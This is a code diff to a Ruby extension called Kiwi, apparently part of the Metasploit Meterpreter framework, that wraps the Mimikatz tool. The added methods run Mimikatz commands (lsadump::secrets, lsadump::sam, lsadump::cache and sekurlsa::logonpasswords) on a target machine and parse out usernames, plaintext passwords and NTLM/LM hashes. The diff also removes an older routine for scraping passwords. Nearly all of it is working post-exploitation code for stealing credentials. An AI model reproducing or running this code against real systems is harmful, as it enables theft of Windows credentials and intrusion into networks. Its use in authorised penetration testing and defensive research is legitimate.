@@ -83,6 +83,144 @@ class Kiwi < Extension
     output[output.index(cmd) + cmd.length + 1, output.length]
   end
 
+  def lsa_dump_secrets
+    exec_cmd('lsadump::secrets')
+  end
+
+  def lsa_dump_sam
+    exec_cmd('lsadump::sam')
+  end
+
+  def lsa_dump_cache
+    exec_cmd('lsadump::cache')
+  end
+
+  def creds_msv
+    { msv: parse_msv(exec_cmd('sekurlsa::msv')) }
+  end
+
+  def creds_wdigest
+    { wdigest: parse_wdigest(exec_cmd('sekurlsa::wdigest')) }
+  end
+
+  def creds_kerberos
+    { kerberos: parse_kerberos(exec_cmd('sekurlsa::kerberos')) }
+  end
+
+  def creds_all
+    output = exec_cmd('sekurlsa::logonpasswords')
+    {
+      msv: parse_msv(output),
+      wdigest: parse_wdigest(output),
+      kerberos: parse_kerberos(output)
+    }
+  end
+
+  def parse_wdigest(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an wdigest line
+      next if line !~ /\swdigest\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      next if line.blank?
+
+      # no, the next 3 lines should be interesting
+      wdigest = {}
+      3.times do
+        k, v = read_value(line)
+        wdigest[k.strip] = v if k
+        line = lines.shift
+      end
+
+      if wdigest.length > 0
+        results[wdigest.values.join('|')] = wdigest
+      end
+    end
+
+    results.values
+  end
+
+  def parse_kerberos(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an kerberos line
+      next if line !~ /\skerberos\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      next if line.blank?
+
+      # no, the next 3 lines should be interesting
+      kerberos = {}
+      3.times do
+        k, v = read_value(line)
+        kerberos[k.strip] = v if k
+        line = lines.shift
+      end
+
+      if kerberos.length > 0
+        results[kerberos.values.join('|')] = kerberos
+      end
+    end
+
+    results.values
+  end
+
+  def parse_msv(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an MSV line
+      next if line !~ /\smsv\s:/
+
+      line = lines.shift
+
+      # loop until we find the 'Primary' entry
+      while line !~ / Primary/ && !line.blank?
+        line = lines.shift
+      end
+
+      # did we find something?
+      next if line.blank?
+
+      # the next 4 lines should be interesting
+      msv = {}
+      4.times do
+        k, v = read_value(lines.shift)
+        msv[k.strip] = v if k
+      end
+
+      if msv.length > 0
+        results[msv.values.join('|')] = msv
+      end
+    end
+
+    results.values
+  end
+
+  def read_value(line)
+    if line =~ /\s*\*\s([^:]*):\s(.*)/
+      return $1, $2
+    end
+
+    return nil, nil
+  end
+
   #
   # Dump the LSA secrets from the target machine.
   #
@@ -279,103 +417,6 @@ class Kiwi < Extension
     end
 
     return results
-  end
-
-  #
-  # Scrape passwords from the target machine.
-  #
-  # @param pwd_id [Fixnum] ID of the type credential to scrape.
-  #
-  # @return [Array<Hash>]
-  def scrape_passwords(pwd_id)
-    request = Packet.create_request('kiwi_scrape_passwords')
-    request.add_tlv(TLV_TYPE_KIWI_PWD_ID, pwd_id)
-    response = client.send_request(request)
-
-    # keep track of unique entries
-    uniques = Set.new
-
-    results = []
-    response.each(TLV_TYPE_KIWI_PWD_RESULT) do |r|
-      result = {
-        :username => r.get_tlv_value(TLV_TYPE_KIWI_PWD_USERNAME),
-        :domain   => r.get_tlv_value(TLV_TYPE_KIWI_PWD_DOMAIN),
-        :password => r.get_tlv_value(TLV_TYPE_KIWI_PWD_PASSWORD),
-        :auth_hi  => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_HI),
-        :auth_lo  => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_LO),
-        :lm       => r.get_tlv_value(TLV_TYPE_KIWI_PWD_LMHASH),
-        :ntlm     => r.get_tlv_value(TLV_TYPE_KIWI_PWD_NTLMHASH)
-      }
-
-      # generate a "unique" set identifier based on the domain/user/pass. We
-      # don't use the whole object because the auth hi/low might be different
-      # but everything else might be the same. Join with non-printable, as this
-      # can't appear in passwords anyway.
-      set_id = [result[:domain], result[:username], result[:password]].join("\x01")
-
-      # only add to the result list if we don't already have it
-      if uniques.add?(set_id)
-        results << result
-      end
-    end
-
-    return results
-  end
-
-  #
-  # Scrape all passwords from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def all_pass
-    scrape_passwords(PWD_ID_SEK_ALLPASS)
-  end
-
-  #
-  # Scrape wdigest credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def wdigest
-    scrape_passwords(PWD_ID_SEK_WDIGEST)
-  end
-
-  #
-  # Scrape msv credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def msv
-    scrape_passwords(PWD_ID_SEK_MSV)
-  end
-
-  #
-  # Scrape LiveSSP credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def livessp
-    scrape_passwords(PWD_ID_SEK_LIVESSP)
-  end
-
-  #
-  # Scrape SSP credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def ssp
-    scrape_passwords(PWD_ID_SEK_SSP)
-  end
-
-  #
-  # Scrape TSPKG credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def tspkg
-    scrape_passwords(PWD_ID_SEK_TSPKG)
-  end
-
-  #
-  # Scrape Kerberos credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def kerberos
-    scrape_passwords(PWD_ID_SEK_KERBEROS)
   end
 
 end
